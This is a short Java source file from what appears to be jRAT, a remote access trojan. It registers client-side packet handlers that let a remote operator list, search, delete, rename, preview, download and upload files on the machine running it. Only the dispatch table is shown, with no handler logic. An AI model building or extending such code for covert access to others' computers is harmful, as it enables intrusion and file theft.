package jrat.module.fs;

import jrat.api.ClientModule;
import jrat.client.packets.incoming.IncomingPackets;
import jrat.module.fs.packets.*;
import jrat.module.fs.packets.download.Packet102DownloadState;
import jrat.module.fs.packets.download.Packet104DownloadPart;
import jrat.module.fs.packets.download.Packet42Download;
import jrat.module.fs.packets.upload.Packet21Upload;

public class FileSystemClientModule extends ClientModule {

    public void init() throws Exception {
        IncomingPackets.register((short) 15, Packet15ListFiles.class);
        IncomingPackets.register((short) 53, Packet53StartSearch.class);
        IncomingPackets.register((short) 54, Packet54StopSearch.class);
        IncomingPackets.register((short) 16, Packet16DeleteFile.class);
        IncomingPackets.register((short) 47, Packet47RenameFile.class);
        IncomingPackets.register((short) 60, Packet60PreviewFile.class);
        IncomingPackets.register((short) 85, Packet85ThumbnailPreview.class);
        IncomingPackets.register((short) 62, Packet62PreviewImage.class);
        IncomingPackets.register((short) 63, Packet63PreviewArchive.class);
        IncomingPackets.register((short) 41, Packet41SpecialDirectory.class);
        IncomingPackets.register((short) 102, Packet102DownloadState.class);
        IncomingPackets.register((short) 42, Packet42Download.class);
        IncomingPackets.register((short) 104, Packet104DownloadPart.class);
        IncomingPackets.register((short) 21, Packet21Upload.class);
    }
}
